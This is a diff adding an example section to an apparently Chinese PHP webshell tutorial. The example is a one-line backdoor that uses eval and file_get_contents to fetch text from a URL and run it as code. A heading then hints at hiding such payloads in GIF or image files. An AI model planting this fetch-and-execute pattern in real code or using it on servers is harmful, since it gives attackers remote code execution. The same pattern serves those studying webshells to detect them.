@@ -260,3 +260,17 @@ str_rot13
 * file_get_contents() 函数把整个文件读入一个字符串中。
 * fopen() 函数打开一个文件或 URL。
 
+## 一个例子
+首先，我们可以选择最简单的**file_get_contents**来实现。
+```php
+<?php  
+eval(file_get_contents("http://localhost/test/Hi.txt"));
+	//读取远程文本，并执行代码。
+```
+输出:  
+![22](https://ws1.sinaimg.cn/large/006VEsyOgy1g0s62k1dnrj30gf08f3zh.jpg)  
+
+### Gif/图片
+如果我们加载一个txt的话，是可以执行代码，但是少了些逼格。
+
+
